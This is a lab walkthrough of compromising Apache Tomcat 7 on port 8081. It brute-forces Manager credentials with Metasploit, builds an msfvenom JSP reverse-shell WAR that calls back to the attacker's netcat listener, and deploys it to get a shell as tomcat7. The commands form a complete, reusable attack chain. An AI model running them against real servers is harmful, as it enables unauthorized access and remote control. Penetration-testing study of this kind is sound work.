# ☁️ Tomcat Reverse Shell via WAR Upload (Port 8081)

> This section explains how I brute-forced Tomcat credentials, uploaded a WAR reverse shell, and gained access to the target server.

---

## 🧪 Lab Details

- **Target IP**: 192.168.182.128  
- **Port**: 8081  
- **Service**: Apache Tomcat 7  
- **Attacker IP**: 192.168.182.129

---

## 🔍 Step 1: Service Discovery

Browser: http://192.168.182.128:8081  
Prompted with a login popup for **Tomcat Manager**.

---

## 🔐 Step 2: Credential Brute-Force

Used Metasploit module:
```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.182.128
set RPORT 8081
run
```
```bash
tomcat:tomcat
```
📌 Result: Login Successful → Default creds or weak creds were accepted.

---

## ☠️ Step 3: Payload Creation (WAR Shell)

Created WAR reverse shell using `msfvenom`:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.182.129 LPORT=4444 -f war -o shell.war
```

Started Netcat listener:
```bash
nc -lvnp 4444
```

---

## 🚀 Step 4: WAR Upload & Exploitation

1. Logged into Tomcat Manager Web Interface
2. Uploaded `shell.war`
3. Navigated to deployed path:
```bash
http://192.168.182.128:8081/shell/  (calls the shell)
```

✅ Result: Reverse shell connected back to attacker's Netcat listener

---

## 🧠 Step 5: Privilege Level

Once shell was obtained:
```bash
whoami
→ tomcat7
```

Gained shell access as **tomcat7** user.

---

## 🔐 Summary

| Element       | Details                        |
|---------------|---------------------------------|
| Service       | Apache Tomcat 7                |
| Exploit       | WAR file upload                |
| Credentials   | Brute-forced via Metasploit    |
| Shell Type    | Reverse shell (Netcat)         |
| User          | tomcat7                        |


